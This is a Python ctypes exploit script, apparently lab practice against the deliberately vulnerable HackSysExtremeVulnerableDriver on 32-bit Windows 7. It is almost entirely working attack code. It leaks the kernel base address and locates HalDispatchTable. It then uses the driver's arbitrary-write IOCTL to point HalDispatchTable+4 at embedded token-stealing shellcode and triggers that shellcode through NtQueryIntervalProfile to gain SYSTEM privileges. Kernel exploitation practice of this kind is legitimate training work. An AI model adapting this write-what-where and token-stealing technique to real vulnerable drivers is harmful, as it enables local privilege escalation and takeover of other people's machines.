import os
import struct
from ctypes import *
from ctypes import wintypes
import sys


GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
FILE_SHARE_DELETE = 0x00000004
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
TRUNCATE_EXISTING = 5
HEAP_ZERO_MEMORY=0x00000008


class _SYSTEM_MODULE_INFORMATION_ENTRY (Structure):
    _fields_ = [("WhoCares",		c_void_p ),
        ("WhoCares2", c_void_p),
		("Base",		c_void_p),
		("Size",		wintypes.ULONG),
		("Flags",		wintypes.ULONG),
		("Index",		wintypes.USHORT),
		("NameLength",		wintypes.USHORT),
		("LoadCount",		wintypes.USHORT),
		("PathLength",		wintypes.USHORT),
		("ImageName",		c_char * 256)]

def SMI_factory(nsize):
    class __SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("ModuleCount", wintypes.ULONG),
                    ('Modules', wintypes.ARRAY (_SYSTEM_MODULE_INFORMATION_ENTRY,nsize))]

    return __SYSTEM_MODULE_INFORMATION


class _WRITE_WHAT_WHERE(Structure):
    _fields_ = [('What', c_void_p),
                ('Where', c_void_p)]



def GetHalDispatchTable():
    SystemModuleInformation=11

    hNtDll=windll.kernel32.GetModuleHandleA("ntdll.dll")
    if (not hNtDll) :
        print ("[-] Failed To get module handle NtDll.dll\n")

    NTquery=windll.kernel32.GetProcAddress(hNtDll, "NtQuerySystemInformation")

    if (not NTquery) :
        print ("[-] Failed To get NTquerySystemInformation address.dll\n")

    print "NtQuerySystemInformation address = 0x%x"%NTquery

    u = c_ulong(0)


    windll.ntdll.NtQuerySystemInformation(SystemModuleInformation, 0, 0, byref(u))

    SYSTEM_MODULE_INFORMATION=SMI_factory(u.value)

    pSystemModuleInformation=SYSTEM_MODULE_INFORMATION()

    buf=create_string_buffer(u.value)

    NtStatus=windll.ntdll.NtQuerySystemInformation(SystemModuleInformation, buf, u.value, 0)


    memmove(byref(pSystemModuleInformation), buf,sizeof(buf))

    KernelBaseAddressInKernelMode=(pSystemModuleInformation.Modules[0].Base)
    KernelImage=pSystemModuleInformation.Modules[0].ImageName
    KernelImage=KernelImage[KernelImage.find("\\"):]

    splitted=KernelImage.split("\\")
    KernelImage=splitted[-1]

    print("[+] Loaded Kernel: %s\n"% KernelImage)
    print("[+] Kernel Base Address: 0x%x\n"% KernelBaseAddressInKernelMode)

    hKernelInUserMode = windll.LoadLibrary(KernelImage)

    if ( not hKernelInUserMode) :
        print ("[-] Failed To Load Kernel\n")
        sys.exit()

    print "User Mode Address :" + hex(hKernelInUserMode._handle)

    HalDispatchTable_usr = windll.kernel32.GetProcAddress(hKernelInUserMode._handle, "HalDispatchTable")

    print "HalDispatchTable_usr: "+ hex(HalDispatchTable_usr)

    HalDispatchTable_off = HalDispatchTable_usr - hKernelInUserMode._handle

    HalDispatchTable_krn = HalDispatchTable_off + KernelBaseAddressInKernelMode

    print "HalDispatchTable_krn: "+ hex(HalDispatchTable_krn)

    return HalDispatchTable_krn


print "OJO SOLO TARGETS WINDOWS 7 de 32 BITS no FUNCIONA EN 64 bits"

shellcode=create_string_buffer("\x53\x56\x57\x60\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x5F\x5E\x5B\xC3")


hDevice = windll.kernel32.CreateFileA(r"\\.\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None )

print int(hDevice)

# heap=windll.kernel32.GetProcessHeap()

WriteWhatWhere_inst=_WRITE_WHAT_WHERE()

# WriteWhatWhere=windll.kernel32.HeapAlloc(heap, HEAP_ZERO_MEMORY,sizeof(_WRITE_WHAT_WHERE))

# print("[+] Memory Allocated: 0x%x\n"% WriteWhatWhere)
#
# print ("[+] Allocation Size: 0x%X\n"% sizeof(_WRITE_WHAT_WHERE))

print("[+] Gathering Information About Kernel\n")


Hal_address_kernel=GetHalDispatchTable()

if (not Hal_address_kernel) :
    print("[-] Failed Gathering Information\n")
    sys.exit()

HalDispatchTablePlus4 = Hal_address_kernel + sizeof(c_voidp)

print "HAL TABLE PLUS 4",hex(HalDispatchTablePlus4)

print ("[+] Preparing WRITE_WHAT_WHERE structure\n")



buf = create_string_buffer(sizeof(c_voidp)*2)


memmove(byref(WriteWhatWhere_inst), buf, sizeof(buf))

old = c_long(1)
windll.kernel32.VirtualProtect(addressof(shellcode), c_int(sizeof(shellcode)),0x40,byref(old))

pshellcode = c_char_p(addressof(shellcode))

WriteWhatWhere_inst.What =addressof(pshellcode)
WriteWhatWhere_inst.Where = HalDispatchTablePlus4


print("[+] WriteWhatWhere->What: 0x%x\n"%int( WriteWhatWhere_inst.What))
print ("[+] WriteWhatWhere->Where: 0x%x\n"% WriteWhatWhere_inst.Where)


print ("[+] Triggering Arbitrary Memory Overwrite\n");



FILE_DEVICE_UNKNOWN=0x00000022
METHOD_NEITHER=3
FILE_ANY_ACCESS=0

HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE=0x22200b

bytes_returned = wintypes.DWORD(0)

raw_input("MIRAR")
windll.kernel32.DeviceIoControl(hDevice,HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, byref(WriteWhatWhere_inst), sizeof(WriteWhatWhere_inst), None, 0, pointer(bytes_returned),0)


Interval=c_int(0)

windll.ntdll.NtQueryIntervalProfile(0x1337, byref(Interval))

windll.kernel32.CloseHandle(hDevice)
os.system("calc.exe")





